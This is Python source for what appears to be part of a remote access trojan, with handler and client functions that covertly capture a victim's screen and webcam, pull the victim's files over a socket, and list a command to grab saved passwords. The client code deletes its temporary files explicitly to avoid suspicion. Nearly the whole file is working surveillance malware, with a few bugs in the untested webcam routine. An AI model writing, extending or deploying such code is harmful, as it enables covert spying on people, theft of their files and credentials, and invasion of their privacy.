import os # directories
import socket # network stuff
import sys # exit()
from cv2 import cv2 # webcam functions
import pyscreenshot as ImageGrab # screenshot


################################____HELP____################################

CUSTOM_COMMANDS = {'help': ['\t\tShows help menu'],
            'screenshot': ['\tTake a screenshot of the targets screen'],
            'download': ['\tDownload chosen file from the target'],
            'webcam': ['\t\tTransfers a picture from the victims primary webcam'],
            'livecam': ['\tTransfers a video from the victims primary webcam'],
            'getpass': ['\tAttempts to grab the victims saved passwords'],
            'quit': ['\t\tQuit to handler']}

def print_help(conn, args):
    print("=================================================================")
    for cmd, v in CUSTOM_COMMANDS.items():
        print("{0}:{1}".format(cmd, v[0]))
    print("=================================================================")
    return

def clear_screen(conn, args):
    print("\n" * 100)
    

############################____File-Transfer____############################

def download(conn, args):
    ### download victims files ###
    conn.send(str.encode('download'))

    filename = str(input("Filename: ")) if not len(args) > 8 else str(args[8:])

    conn.send(str.encode(filename))
    f = open(filename, 'wb')
    i = conn.recv(1024)
    while not (b'complete' in i):
        f.write(i)
        i = conn.recv(1024)
    f.close()
    print(str(filename) + ' successfully saved to: ' + str(os.path.dirname(os.path.realpath(filename))))
    # otherwise you can just try the command again

def upload(soc):
    ### find file and start transfer to attacker ###
    filename = soc.recv(1024)[:].decode("utf-8")
    #filename = filen[:].decode("utf-8")
    print(filename)
    #try:
    f = open(filename, 'rb')
    #except Exception as e:
    #    outstr = "Could not find file: %s\n" %str(e)
    #    return outstr
    #else:
    outstr = ""
    i = f.read(1024)
    while (i):
        soc.send(i)
        i = f.read(1024)
    f.close()
    soc.send(b'complete')
    return outstr


#############################____Screenshot____#############################

def screenshot(conn, args):
    ### request and collect victims screenshot ###
    conn.send(str.encode('capturing'))
    print('\ncapturing screen...')
    # if there is more after the cmd "screenshot" use it as a name
    if len(args) > 10: 
        if '.png' in str(args[11:]):
            f = open(str(args[11:]), 'wb')
        else:
            f = open(str(args[11:]) + '.png', 'wb')
    else:
        number = 1
        while 1:
            name = 'screenshot' + str(number) + '.png'
            if os.path.isfile(name):
                number+=1
            else:
                break
        f = open(name, 'wb')
    img = conn.recv(1024)
    f.write(img)
    #print(str(img))
    # keep sending byte chunks of the screenshot until fully transfered
    while not ('complete' in str(img)):
        img = conn.recv(1024)
        #print(str(img))
        f.write(img)
    f.close()
    #done
    print('screenshot successfully transfered!\n')


def screenshot_cli(soc):
    ### take local screenshot then send over socket to attacker ###
    try:
        im = ImageGrab.grab()
        im.save('screenshot.png')
    except Exception as e:
        outstr = "Uable to take and save screenshot: %s\n" %str(e)
        return outstr
    else:
        outstr = ""
    f = open('screenshot.png', 'rb')
    i = f.read(1024)
    while i != b'':
        soc.send(i)
        i = f.read(1024)
    f.close()
    soc.send(b'complete')
    # remove to stop suspicion
    os.remove('screenshot.png')
    return outstr


#############################____Webcam-Snap____#############################

def webcam(conn):
    ### request and collect webcam snap ###
    conn.send(str.encode('snap'))
    f = open('camera.png', 'wb')
    img = conn.recv(1024)
    f.write(img)
    while not('complete' in str(img)):
        img = conn.recv(1024)
        f.write(img)
    f.close()


### NOTE: i dont actually know if this works. i dont have a webcam :(
def webcam_cli(soc):
    ### take local snap then transfer to attacker in chunks at a time ###
    # goddamn cv2 gonna be pissn me off i know it
    try:
        cap = cv2.VideoCapture(0)
        ret_value, image = cap.read()
        # fuckit i just want that warning gone
        ret_value=ret_value
        cv2.imwrite('camera.png', image)
    except Exception as e:
        outstr = "Cannot access webcam: %s\n" %str(e)
        return outstr
    else:
        outstr = ""
    del(cap) # < remove from stack
    soc.send('webcam')
    f = open('camer.png', 'rb')
    i = f.read(1024)
    # once again, keep transfering in chunks until complete
    while i != b'':
        soc.send(i)
        i = f.read(1024)
    f.close()
    soc.send(b'complete')
    # remove local file from victims computer to stay annonymous
    os.remove('camera.png')
    return outstr

###########################################################################
